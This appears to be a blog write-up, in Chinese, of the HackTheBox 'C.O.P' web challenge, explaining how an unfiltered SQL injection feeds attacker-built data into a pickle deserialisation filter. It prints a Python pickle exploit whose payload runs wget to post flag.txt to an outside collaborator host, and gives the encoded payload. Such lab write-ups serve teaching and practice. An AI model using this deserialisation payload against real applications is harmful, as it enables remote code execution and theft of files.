---
title: HackTheBox C.O.P WriteUP
date: 2023-08-29 14:54:12
tags:
- HackTheBox
- Web
- SQL注入
- Python反序列化
---

## 题目

> The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

![challenge](image.png)

## 思路

### SQL注入

`routes.py`中可以看到两条URI：

![routes](image-1.png)

跟踪`product_id`,可以看到此处并未对传入的参数进行任何过滤，存在SQL注入：

![SQL injection](image-2.png)

### 反序列化

网站使用了Jinja2 模板引擎，主页代码如下：

![index](image-3.png)

这里会循环读取商品列表，获取数据库中商品的信息。另外我们可以看到网站设置了template_filter('pickle')，所以这里会用`pickle_loads(s)`处理检索来的`product.data`

![app.py](image-4.png)

所以我们需要构造一条python的序列化数据，传入pickle_loads(s)并执行，从而实现RCE。

## 解题

首先使用python构造一条序列化数据，这里照着题目给的源码写就可以了。

``` python
import pickle, base64
import os

class Exploit(object):
    def __reduce__(self):
        cmd = ("wget --post-file flag.txt mf5rw3jw4to5z0jk3gclnr8gs7yxmm.oastify.com")
        return (os.system, (cmd,))

malicious_payload = pickle.dumps(Exploit())

print(base64.b64encode(malicious_payload).decode())
```

输出出来的Payload大概是这样的：

```
gASVXwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjER3Z2V0IC0tcG9zdC1maWxlIGZsYWcudHh0IG1mNXJ3M2p3NHRvNXowamszZ2NsbnI4Z3M3eXhtbS5vYXN0aWZ5LmNvbZSFlFKULg==
```

然后构造SQL注入Payload:

![payload](image-5.png)

**PWN!**

![FLAG](image-6.png)

## 后记

开始做题的时候钻了牛角尖，绞尽脑汁想怎么把序列化的数据写到数据库里。

其实只要让查询语句返回的内容是自己构造好的序列化数据就可以了。